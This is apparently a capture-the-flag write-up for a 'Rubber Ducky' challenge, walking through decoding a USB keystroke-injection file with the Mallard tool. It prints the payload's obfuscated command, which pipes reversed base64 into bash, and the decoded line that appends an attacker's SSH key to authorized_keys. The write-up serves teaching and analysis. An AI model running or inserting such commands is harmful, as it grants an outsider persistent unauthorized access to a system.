(ch5)=
Rubber Ducky
===
*Evaluate the USB data in /mnt/USBDEVICE/*

First of all, let's see what `/mnt/USBDEVICE` contains:

```Shell
$ ls -l /mnt/USBDEVICE
total 4
-rw-r--r-- 1 root root 2090 Now 30 22:14 inject.bin
```

Oh, look. There is a file called `inject.bin`. Given the context and the special name, that is probably a `Ducky` script. <br>
We could use [**Mallard**](https://github.com/dagonis/Mallard) to decode and view it's contents.
Fortunately, we already have the Mallard script in our home.

```Shell
$ ls -l
total 12
-rwxr-xr-x root root 8802 Nov 30 22:14 mallard.py*
```

Let's use it.

```Shell
$ python mallard.py --file /mnt/USBDEVICE/inject.bin
[...]
STRING echo ==gCzlXZr9FZlpXay9Ga0VXYvg2cz5yL+BiP+AyJt92YuIXZ39Gd0N3byZ2ajFmau4WdmxGbvJHdAB3bvd2Ytl3ajlGILFESV1mWVN2SChVYTp1VhNlRyQ1UkdFZopkbS1EbHpFSwdlVRJlRVNFdwM2SGVEZnRTaihmVXJ2ZRhVWvJFSJBTOtJ2ZV12YuVlMkd2dTVGb0dUSJ5UMVdGNXl1ZrhkYzZ0ValnQDRmd1cUS6x2RJpHbHFWVClHZOpVVTpnWwQFdSdEVIJlRS9GZyoVcKJTVzwWMkBDcWFGdW1GZvJFSTJHZIdlWKhkU14UbVBSYzJXLoN3cnAyboNWZ | rev | base64 -d | bash
[...]
```
Mhh.. Seems like someone is trying to execute a `base64` encoded reversed (`rev`) command. We can decode it simply excuting `rev` and `base64 -d` (decode) with the string. <br>
We can copy the entire command from `echo`, but <ins>**we must remove the final instruction, `bash`, or else it will execute!**</ibns>

```Shell
$ echo ==gCzlXZr9FZlpXay9Ga0VXYvg2cz5yL+BiP+AyJt92YuIXZ39Gd0N3byZ2ajFmau4WdmxGbvJHdAB3bvd2Ytl3ajlGILFESV1mWVN2SChVYTp1VhNlRyQ1UkdFZopkbS1EbHpFSwdlVRJlRVNFdwM2SGVEZnRTaihmVXJ2ZRhVWvJFSJBTOtJ2ZV12YuVlMkd2dTVGb0dUSJ5UMVdGNXl1ZrhkYzZ0ValnQDRmd1cUS6x2RJpHbHFWVClHZOpVVTpnWwQFdSdEVIJlRS9GZyoVcKJTVzwWMkBDcWFGdW1GZvJFSTJHZIdlWKhkU14UbVBSYzJXLoN3cnAyboNWZ | rev | base64 -d

echo 'ssh-rsa UmN5RHJZWHdrSHRodmVtaVp0d1l3U2JqZ2doRFRHTGRtT0ZzSUZNdyBUaGlzIGlzIG5vdCByZWFsbHkgYW4gU1NIIGtleSwgd2UncmUgbm90IHRoYXQgbWVhbi4gdEFKc0tSUFRQVWpHZGlMRnJhdWdST2FSaWZSaXBKcUZmUHAK ickymcgoop@trollfun.jackfrosttower.com' >> ~/.ssh/authorized_keys

```

This adds an `SSH` key to the `authorized_keys` file. The troll's username is **ickymcgoop**.
